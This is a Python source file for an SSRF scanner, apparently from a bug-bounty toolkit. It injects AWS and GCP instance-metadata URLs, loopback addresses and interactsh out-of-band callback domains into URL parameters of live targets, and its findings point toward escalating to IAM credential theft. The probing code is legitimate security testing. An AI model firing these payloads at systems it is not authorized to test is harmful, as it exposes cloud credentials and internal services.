#!/usr/bin/env python3
"""
SSRF (Server-Side Request Forgery) scanner — detection only, no exploitation.

For each query-string parameter on a URL that looks like it might control a
server-side fetch, sends five GET requests without following redirects: a
baseline (param pointed at a normal external URL), then four payloads --
AWS instance metadata, GCP instance metadata, and two loopback addresses.
Two independent classification paths, matching how confidently each proves
something:

  Cloud metadata payloads (AWS/GCP): classified by response BODY CONTENT.
  If the target application's response reflects recognizable metadata
  content (an AWS instance-id, a GCP computeMetadata marker, or JSON-shaped
  content the baseline response didn't have), that's direct, unambiguous
  proof the server-side fetch reached the metadata service. CRITICAL.

  Loopback payloads (127.0.0.1 / localhost): no fixed content signature
  exists for these -- what's listening on a target's internal loopback is
  unknowable in advance. Classified by DIFFERENTIAL behavior instead:
  status code, response length, or response timing meaningfully different
  from the external baseline. This is a behavioral signal, not proof --
  MEDIUM, and the finding's note says so explicitly.

  A third, independent corroborating signal (folded into whichever path is
  active): if the target's own response is itself a 3xx redirect whose
  Location header resolves to a private/loopback/link-local address, that's
  meaningful regardless of which payload triggered it -- checked via
  safe_http.py's is_private_or_internal_host(), reusing the exact IP-range
  classification the SSRF redirect-target guard already uses, not a
  reimplementation.

Candidate parameter names are not invented fresh: the base set is
tools/lead_board.py's two existing SSRF routing rules (url, uri, dest,
destination, domain, site, callback, fetch, load, proxy, feed, host, to,
out, image_url, imageurl, continue_url, callback_url, notify_url,
ping_url, webhook), extended with names this scanner was asked to also
cover (src, path, endpoint, image, avatar, import) that lead_board.py's
patterns don't include.

Cost note: each candidate param costs 5 requests (1 baseline + 4 payloads).
A URL with several candidate params gets noisy fast -- this is detection
only, fired at whatever rate BBHUNT_RATE_LIMIT_RPS allows via safe_http.py.

Uses safe_http.py's safe_urlopen(..., follow_redirects=False): a redirect
triggered by an SSRF payload is itself diagnostic (see the third signal
above), so the raw first hop must be observable, not silently chased away
the way safe_urlopen's default mode would.

This is detection only -- confirming a server-side fetch reached an
internal/metadata address, never attempting to escalate (e.g. never
actually requesting the IAM security-credentials sub-path, never trying to
pivot further). Same discipline as every other scanner built this session.

Usage:
  tools/ssrf_scanner.py "https://api.target.com/fetch?url=https://cdn.example.com/a.png"
  tools/ssrf_scanner.py -l urls.txt --json
"""
from __future__ import annotations

import argparse
import json
import os
import queue
import re
import shutil
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.request
import uuid
from dataclasses import dataclass, field
from pathlib import Path
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

_REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _REPO not in sys.path:
    sys.path.insert(0, _REPO)
from tools.safe_http import safe_urlopen, is_private_or_internal_host  # noqa: E402

USER_AGENT = "agentic-bug-hunter/ssrf_scanner"

CRITICAL, MEDIUM = "CRITICAL", "MEDIUM"

MAX_BODY_BYTES = 65536  # cap how much response body we read/search per request

BASELINE_URL = "https://example.com/"
AWS_METADATA_URL = "http://169.254.169.254/latest/meta-data/"
GCP_METADATA_URL = "http://metadata.google.internal/computeMetadata/v1/"
LOOPBACK_IP_URL = "http://127.0.0.1/"
LOOPBACK_HOST_URL = "http://localhost/"

# (payload url, kind, extra headers or None, human description)
PAYLOADS = [
    (AWS_METADATA_URL, "aws-metadata", None, "AWS instance metadata"),
    # GCP's metadata service demands this header or it 403s. Sending it on
    # OUR request to the target app (not to the metadata service, which we
    # never talk to directly) only helps if the target is the specific
    # subclass of vulnerable endpoint that forwards caller headers through
    # to its own internal fetch (webhook relays / URL-preview proxies
    # commonly do this) -- worth trying, ignored harmlessly otherwise.
    (GCP_METADATA_URL, "gcp-metadata", {"Metadata-Flavor": "Google"}, "GCP instance metadata"),
    (LOOPBACK_IP_URL, "internal-loopback", None, "loopback (127.0.0.1)"),
    (LOOPBACK_HOST_URL, "internal-loopback", None, "loopback (localhost)"),
]

AWS_METADATA_MARKERS = ("ami-id", "instance-id", "security-credentials", "instance-action", "local-ipv4")
GCP_METADATA_MARKERS = ("computemetadata", "project-id", "service-accounts", "instance/hostname")

SSRF_PARAM_NAMES = {
    # From tools/lead_board.py's two hunt-ssrf routing rules:
    "url", "uri", "dest", "destination", "domain", "site", "callback",
    "fetch", "load", "proxy", "feed", "host", "to", "out", "image_url",
    "imageurl", "continue_url", "callback_url", "notify_url", "ping_url",
    "webhook",
    # Additional names this scanner was asked to also cover:
    "src", "path", "endpoint", "image", "avatar", "import",
}


@dataclass
class SsrfFinding:
    url: str
    param: str
    payload: str
    evidence: str
    severity: str
    title: str
    note: str = ""

    def as_dict(self) -> dict:
        return {
            "url": self.url,
            "param": self.param,
            "payload": self.payload,
            "evidence": self.evidence,
            "severity": self.severity,
            "title": self.title,
            "note": self.note,
        }


def find_ssrf_params(url: str) -> list[str]:
    """Query-string param names on `url` that match SSRF_PARAM_NAMES
    (case-insensitive). Pure function."""
    query = urlparse(url).query
    if not query:
        return []
    names = [k for k, _ in parse_qsl(query, keep_blank_values=True)]
    seen = set()
    matched = []
    for n in names:
        if n.lower() in SSRF_PARAM_NAMES and n not in seen:
            seen.add(n)
            matched.append(n)
    return matched


def build_payload_url(url: str, param: str, new_value: str) -> str:
    """`url` with `param`'s value replaced by `new_value`; every other
    param and the original param order is preserved. Pure function.

    Intentionally duplicated from openredirect_scanner.py's identical
    helper rather than imported cross-scanner -- both are standalone CLI
    tools with no dependency on each other today, and this is a tiny (5
    line), fully generic query-string utility with no SSRF- or
    redirect-specific logic in it. Known, deliberate, minor DRY debt.
    """
    parsed = urlparse(url)
    pairs = parse_qsl(parsed.query, keep_blank_values=True)
    new_pairs = [(k, new_value if k == param else v) for k, v in pairs]
    return urlunparse(parsed._replace(query=urlencode(new_pairs)))


def classify_metadata(
    url: str, param: str, payload: str, payload_kind: str,
    body: str, baseline_body: str, location: str | None = None,
) -> SsrfFinding | None:
    """Cloud-metadata payload classification: direct body-content proof.
    Pure function."""
    markers = AWS_METADATA_MARKERS if payload_kind == "aws-metadata" else GCP_METADATA_MARKERS
    body_lower = (body or "").lower()
    hit_markers = [m for m in markers if m in body_lower]

    looks_like_new_json = bool(body) and body.lstrip()[:1] in ("{", "[") and (
        not baseline_body or baseline_body.lstrip()[:1] not in ("{", "[")
    )

    location_signal = None
    if location:
        loc_host = urlparse(location).hostname
        if loc_host and is_private_or_internal_host(loc_host):
            location_signal = f"redirected to internal-looking Location: {location!r}"

    if not hit_markers and not looks_like_new_json and not location_signal:
        return None

    evidence_parts = []
    if hit_markers:
        evidence_parts.append(f"response body contains metadata marker(s): {hit_markers}")
    if looks_like_new_json:
        evidence_parts.append("response body is JSON-shaped where the baseline response was not")
    if location_signal:
        evidence_parts.append(location_signal)

    cloud = "AWS" if payload_kind == "aws-metadata" else "GCP"
    return SsrfFinding(
        url, param, payload, "; ".join(evidence_parts), CRITICAL,
        f"SSRF to {cloud} cloud metadata via `{param}` parameter",
        "Response directly reflects cloud metadata service content -- "
        "confirmed server-side fetch reached the instance metadata "
        "endpoint. This is detection only; escalating to actually read "
        "IAM credentials is a separate, deliberate next step -- see "
        "agents/chain-builder.md's SSRF -> cloud metadata chain.",
    )


def classify_internal(
    url: str, param: str, payload: str, target_desc: str,
    baseline_status: int | None, baseline_len: int, baseline_ms: float,
    status: int | None, body_len: int, elapsed_ms: float,
    location: str | None = None,
) -> SsrfFinding | None:
    """Loopback payload classification: differential behavior only, no
    fixed content signature exists. Pure function."""
    signals = []
    if status is not None and baseline_status is not None and status != baseline_status:
        signals.append(f"status {status} vs baseline {baseline_status}")
    if abs(body_len - baseline_len) > max(64, baseline_len * 0.25):
        signals.append(f"length {body_len}B vs baseline {baseline_len}B")
    if abs(elapsed_ms - baseline_ms) > 1000:
        signals.append(f"timing {elapsed_ms:.0f}ms vs baseline {baseline_ms:.0f}ms")
    if location:
        loc_host = urlparse(location).hostname
        if loc_host and is_private_or_internal_host(loc_host):
            signals.append(f"redirected to internal-looking Location: {location!r}")

    if not signals:
        return None

    return SsrfFinding(
        url, param, payload, "; ".join(signals), MEDIUM,
        f"Possible SSRF to internal address ({target_desc}) via `{param}` parameter",
        "Response differs meaningfully from the external baseline when the "
        "param is pointed at an internal address -- a behavioral signal "
        "only, not direct proof the way cloud metadata content is (no "
        "fixed signature exists for an arbitrary internal service). "
        "Manually confirm before reporting: re-fetch and diff the actual "
        "response bodies side by side.",
    )


def _fetch_probe(url: str, extra_headers: dict | None, timeout: int):
    """GET `url` WITHOUT following redirects; return
    (status_or_None, body_text, body_len, elapsed_ms, location_or_None).
    status is None only on an outright connection failure."""
    headers = {"User-Agent": USER_AGENT}
    if extra_headers:
        headers.update(extra_headers)
    req = urllib.request.Request(url, headers=headers, method="GET")
    t0 = time.monotonic()
    try:
        resp = safe_urlopen(req, timeout=timeout, follow_redirects=False)
        try:
            raw = resp.read(MAX_BODY_BYTES)
            elapsed_ms = (time.monotonic() - t0) * 1000
            text = raw.decode("utf-8", errors="replace") if raw else ""
            location = resp.headers.get("Location") if resp.status in (301, 302, 303, 307, 308) else None
            return resp.status, text, len(raw), elapsed_ms, location
        finally:
            close = getattr(resp, "close", None)
            if callable(close):
                close()
    except urllib.error.HTTPError:
        elapsed_ms = (time.monotonic() - t0) * 1000
        return None, "", 0, elapsed_ms, None  # genuine 4xx/5xx
    except (urllib.error.URLError, TimeoutError, ConnectionError):
        elapsed_ms = (time.monotonic() - t0) * 1000
        return None, "", 0, elapsed_ms, None


def scan_url(url: str, timeout: int = 15) -> list[SsrfFinding]:
    findings: list[SsrfFinding] = []

    for param in find_ssrf_params(url):
        baseline_url = build_payload_url(url, param, BASELINE_URL)
        b_status, b_body, b_len, b_ms, _b_location = _fetch_probe(baseline_url, None, timeout)

        for payload, kind, extra_headers, desc in PAYLOADS:
            payload_url = build_payload_url(url, param, payload)
            status, body, body_len, elapsed_ms, location = _fetch_probe(payload_url, extra_headers, timeout)

            if kind in ("aws-metadata", "gcp-metadata"):
                finding = classify_metadata(url, param, payload, kind, body, b_body, location)
            else:
                finding = classify_internal(
                    url, param, payload, desc,
                    b_status, b_len, b_ms,
                    status, body_len, elapsed_ms, location,
                )

            if finding:
                findings.append(finding)

    return findings


# =============================================================================
# Blind SSRF via interactsh (--oob, opt-in, off by default)
#
# The direct-detection functions above need an in-band signal: a response
# body, a status/length/timing difference, a Location header. A target that
# validates/blocks the metadata and loopback addresses but still performs
# an unrestricted server-side fetch of an attacker-controlled EXTERNAL
# domain is invisible to all of that -- the only way to catch it is to make
# the target's own server reach out to infrastructure we control and
# listen for the callback. That's what this section does, wrapping
# ProjectDiscovery's interactsh-client the same way tools/oob_listener.py
# already does (same marker-generation convention, same left-label
# substring correlation) rather than inventing a different scheme.
#
# Real CLI flags confirmed against the installed binary's own --help before
# writing any of this (not assumed): interactsh-client has no "print your
# domain and exit" flag, and its default server list
# (oast.pro/live/site/online/fun/me) is what _OOB_DOMAIN_RE below anchors
# on to extract the auto-registered domain from the client's own startup
# output, rather than guessing at a banner format blindly.
#
# Per-payload correlation: interactsh-client's own -n/-number flag
# pre-generates N payloads up front, but reading those back out and mapping
# them to specific params after the fact is more fragile than the approach
# tools/oob_listener.py already uses -- generate a distinct uuid4-based
# marker PER CANDIDATE PARAM ourselves, in Python, and prefix each one onto
# the single shared domain interactsh-client registered. Same effect
# (distinct subdomain label per payload), simpler to control.
# =============================================================================

_OOB_DOMAIN_RE = re.compile(
    r"\b[a-z0-9]+\.(?:oast\.(?:pro|live|site|online|fun|me))\b", re.IGNORECASE
)


def _oob_reader_thread(pipe, out_queue: queue.Queue) -> None:
    try:
        for line in iter(pipe.readline, ""):
            out_queue.put(line)
    finally:
        out_queue.put(None)  # sentinel: stream closed / EOF


class InteractshSession:
    """Wraps one running `interactsh-client -json` subprocess. Constructed
    only by start_interactsh_session() below -- never instantiate directly
    in real use, but tests build one from a fake Popen-like stand-in to
    exercise poll()/close() without a real subprocess."""

    def __init__(self, proc, domain: str):
        self.proc = proc
        self.domain = domain
        self._queue: queue.Queue = queue.Queue()
        self._thread = threading.Thread(
            target=_oob_reader_thread, args=(proc.stdout, self._queue), daemon=True
        )
        self._thread.start()

    def poll(self, window_seconds: float) -> list[dict]:
        """Drain whatever interaction JSON lines accumulate over the next
        `window_seconds`. Returns [] on a quiet window -- callers must NOT
        treat an empty list as "confirmed not vulnerable"; see
        scan_url_oob()'s docstring."""
        interactions = []
        deadline = time.monotonic() + window_seconds
        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                break
            try:
                line = self._queue.get(timeout=remaining)
            except queue.Empty:
                break
            if line is None:
                break  # stream closed
            line = line.strip()
            if not line:
                continue
            try:
                interactions.append(json.loads(line))
            except json.JSONDecodeError:
                continue  # non-JSON noise line (banner, log), not an interaction
        return interactions

    def close(self) -> None:
        try:
            self.proc.terminate()
            self.proc.wait(timeout=5)
        except Exception:  # noqa: BLE001 -- best-effort cleanup, never let this raise
            try:
                self.proc.kill()
            except Exception:  # noqa: BLE001
                pass


def start_interactsh_session(startup_timeout: float = 15) -> InteractshSession | None:
    """Start `interactsh-client -json` and wait for it to register a
    session, extracting the auto-generated OOB domain from its startup
    output. Returns None (never raises) if the binary is missing, fails to
    start, or doesn't register a recognizable domain within
    startup_timeout -- every one of those is a real, distinct failure mode
    callers must surface explicitly (see main()'s --oob handling), not
    treat as "0 findings"."""
    if shutil.which("interactsh-client") is None:
        return None
    try:
        proc = subprocess.Popen(
            ["interactsh-client", "-json"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1,
        )
    except OSError:
        return None

    session = InteractshSession(proc, domain="")  # domain filled in below once found
    deadline = time.monotonic() + startup_timeout
    domain = None
    while time.monotonic() < deadline:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            break
        try:
            line = session._queue.get(timeout=remaining)
        except queue.Empty:
            break
        if line is None:
            break
        m = _OOB_DOMAIN_RE.search(line)
        if m:
            domain = m.group(0)
            break

    if not domain:
        session.close()
        return None
    session.domain = domain
    return session


def _oob_marker() -> str:
    return f"ssrf-{uuid.uuid4().hex[:12]}"


def build_oob_payloads(url: str, params: list[str], oob_domain: str) -> list[dict]:
    """One unique marker + payload URL per candidate param. Pure function."""
    records = []
    for param in params:
        marker = _oob_marker()
        payload = f"http://{marker}.{oob_domain}/"
        records.append({
            "param": param,
            "marker": marker,
            "payload": payload,
            "payload_url": build_payload_url(url, param, payload),
        })
    return records


def correlate_oob(interactions: list[dict], records: list[dict]) -> dict[str, list[dict]]:
    """marker -> matching interaction dicts, via substring match on the
    marker's (dot-free) label against interactsh's id/host fields -- same
    approach as tools/oob_listener.py's correlate(). Pure function."""
    hits: dict[str, list[dict]] = {}
    for inter in interactions:
        host = (
            inter.get("full-id") or inter.get("fullId")
            or inter.get("unique-id") or inter.get("host") or ""
        ).lower()
        for rec in records:
            if rec["marker"] in host:
                hits.setdefault(rec["marker"], []).append(inter)
    return hits


def _fire_oob_payload(url: str, timeout: int) -> bool:
    """Fire-and-forget GET; the response body/status is irrelevant for
    blind SSRF (the whole point is there's no in-band signal) -- only
    whether the request was actually SENT matters, since that determines
    whether this param belongs in the "tested" set at all. Returns False
    (not fired) on a scope block or connection failure; True otherwise,
    including on a non-2xx HTTP response (still genuinely sent)."""
    headers = {"User-Agent": USER_AGENT}
    req = urllib.request.Request(url, headers=headers, method="GET")
    try:
        resp = safe_urlopen(req, timeout=timeout, follow_redirects=False)
        close = getattr(resp, "close", None)
        if callable(close):
            close()
        return True
    except urllib.error.HTTPError:
        return True  # reached the target and got a response; still "fired"
    except (urllib.error.URLError, TimeoutError, ConnectionError):
        return False  # scope-blocked or genuinely unreachable -- not fired


@dataclass
class OobScanResult:
    """Everything from one URL's blind-SSRF attempt. Deliberately carries
    MORE than just `findings`, because an empty findings list here is
    genuinely ambiguous on its own -- see the module docstring's "handling
    ambiguity" section. `poll_status` is what tells a caller whether an
    empty `findings` means "we tested and heard nothing" versus "we
    couldn't test at all"."""

    url: str
    findings: list[SsrfFinding] = field(default_factory=list)
    tested: list[dict] = field(default_factory=list)  # every param/marker actually fired
    poll_status: str = "completed"  # "completed" | "no_candidate_params" | "listener_unavailable"

    def untriggered(self) -> list[dict]:
        """Params that WERE fired but produced no callback in the poll
        window. Not evidence of anything -- just silence. Exposed so a
        caller can show "N tested, 0 confirmed, M pending/unconfirmed"
        rather than silently dropping this information."""
        triggered_markers = {f.payload.split("//", 1)[-1].split(".", 1)[0] for f in self.findings}
        return [r for r in self.tested if r["marker"] not in triggered_markers]


def scan_url_oob(
    url: str, session: InteractshSession, timeout: int = 15, poll_window: float = 20,
) -> OobScanResult:
    """Fire one OOB payload per candidate param on `url`, poll `session`
    for `poll_window` seconds, correlate. A finding requires an ACTUAL
    interactsh callback -- direct proof, same CRITICAL severity as a
    confirmed cloud-metadata match, just via a different channel.

    THE AMBIGUITY THIS FUNCTION MUST NEVER PAPER OVER: an empty
    `findings` list does not mean "not vulnerable". It means no callback
    arrived inside this specific poll window, which can happen for
    reasons that have nothing to do with whether the target is
    vulnerable -- network latency, the target's own fetch being async or
    queued, DNS propagation to the interactsh server, or the poll window
    simply being too short for this particular target. OobScanResult
    keeps `tested` (what was actually attempted) separate from `findings`
    (what was actually confirmed) specifically so callers can't collapse
    "no confirmed positive" into "confirmed negative" -- there is no such
    thing as a confirmed negative here, only "no signal observed yet".
    """
    params = find_ssrf_params(url)
    if not params:
        return OobScanResult(url=url, poll_status="no_candidate_params")

    candidates = build_oob_payloads(url, params, session.domain)
    fired = [rec for rec in candidates if _fire_oob_payload(rec["payload_url"], timeout)]

    interactions = session.poll(poll_window)
    hits = correlate_oob(interactions, fired)

    findings: list[SsrfFinding] = []
    for rec in fired:
        marker_hits = hits.get(rec["marker"], [])
        if not marker_hits:
            continue
        protocols = sorted({h.get("protocol", h.get("proto", "?")) for h in marker_hits})
        findings.append(SsrfFinding(
            url, rec["param"], rec["payload"],
            f"interactsh callback received: {len(marker_hits)} interaction(s), protocol(s)={protocols}",
            CRITICAL,
            f"Blind SSRF (OOB-confirmed) via `{rec['param']}` parameter",
            "An out-of-band interaction was received on our callback "
            "domain -- direct proof the server made a real outbound "
            "request, just observed via a different channel than an "
            "in-band HTTP response. Detection only: this confirms the "
            "fetch happened, not what (if anything) can be reached from it.",
        ))

    return OobScanResult(url=url, findings=findings, tested=fired, poll_status="completed")


def _print_oob_human(url: str, result: OobScanResult) -> None:
    if result.poll_status == "no_candidate_params":
        return
    for f in result.findings:
        print(f"[{f.severity}] {f.title}")
        print(f"    url:      {f.url}")
        print(f"    param:    {f.param}")
        print(f"    payload:  {f.payload}")
        print(f"    evidence: {f.evidence}")
        if f.note:
            print(f"    note:     {f.note}")
    pending = result.untriggered()
    if pending:
        print(
            f"[no-oob-signal] {url} — {len(pending)} of {len(result.tested)} OOB "
            f"payload(s) produced no interactsh callback in the poll window. "
            f"This does NOT confirm those params are safe -- it means no "
            f"signal was observed in this window; see module docstring."
        )


def _print_human(url: str, findings: list[SsrfFinding]) -> None:
    if not findings:
        print(f"[ok] {url} — no SSRF detected")
        return
    for f in findings:
        print(f"[{f.severity}] {f.title}")
        print(f"    url:      {f.url}")
        print(f"    param:    {f.param}")
        print(f"    payload:  {f.payload}")
        print(f"    evidence: {f.evidence}")
        if f.note:
            print(f"    note:     {f.note}")
    print(f"\n{len(findings)} SSRF finding(s) on {url}")


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description="SSRF scanner (detection only)")
    ap.add_argument("url", nargs="?", help="target URL (with query params)")
    ap.add_argument("-l", "--list", help="file of URLs (one per line)")
    ap.add_argument("--timeout", type=int, default=15)
    ap.add_argument("--json", action="store_true", help="machine-readable output")
    ap.add_argument(
        "--oob", action="store_true",
        help="also attempt blind SSRF detection via interactsh-client (opt-in: "
             "slower, needs external infra reachable, off by default)",
    )
    ap.add_argument(
        "--oob-poll-window", type=int, default=20,
        help="seconds to wait for interactsh callbacks per URL (default: 20)",
    )
    args = ap.parse_args(argv)

    urls: list[str] = []
    if args.list:
        urls += [l.strip() for l in Path(args.list).read_text().splitlines() if l.strip()]
    if args.url:
        urls.append(args.url)
    if not urls:
        ap.error("provide a URL or -l <file>")

    oob_session = None
    if args.oob:
        oob_session = start_interactsh_session()
        if oob_session is None:
            print(
                "[!] --oob requested but interactsh-client is unavailable, failed to "
                "start, or didn't register a session -- direct-detection results "
                "below are unaffected, but NO conclusion about blind SSRF can be "
                "drawn from this run (not \"none found\" -- simply not tested).",
                file=sys.stderr,
            )

    all_findings: list[SsrfFinding] = []
    oob_results: list[OobScanResult] = []
    for u in urls:
        fs = scan_url(u, timeout=args.timeout)
        all_findings += fs
        if not args.json:
            _print_human(u, fs)

        if args.oob and oob_session is not None:
            oob_result = scan_url_oob(u, oob_session, timeout=args.timeout, poll_window=args.oob_poll_window)
            all_findings += oob_result.findings
            oob_results.append(oob_result)
            if not args.json:
                _print_oob_human(u, oob_result)

    if oob_session is not None:
        oob_session.close()

    if args.json:
        print(json.dumps([f.as_dict() for f in all_findings], indent=2))
        if args.oob:
            # Ambiguity status is deliberately kept OUT of the primary
            # findings array (which stays the same bare-array shape every
            # other scanner this session uses) and reported separately on
            # stderr instead, so a caller parsing stdout as JSON can't
            # accidentally treat "0 findings" as "confirmed clean".
            oob_status = {
                "oob_attempted": args.oob,
                "oob_session_available": oob_session is not None,
                "oob_results": [
                    {
                        "url": r.url,
                        "poll_status": r.poll_status,
                        "tested": len(r.tested),
                        "confirmed": len(r.findings),
                        "untriggered": len(r.untriggered()),
                    }
                    for r in oob_results
                ],
            }
            print(json.dumps(oob_status, indent=2), file=sys.stderr)

    return 2 if all_findings else 0


if __name__ == "__main__":
    sys.exit(main())
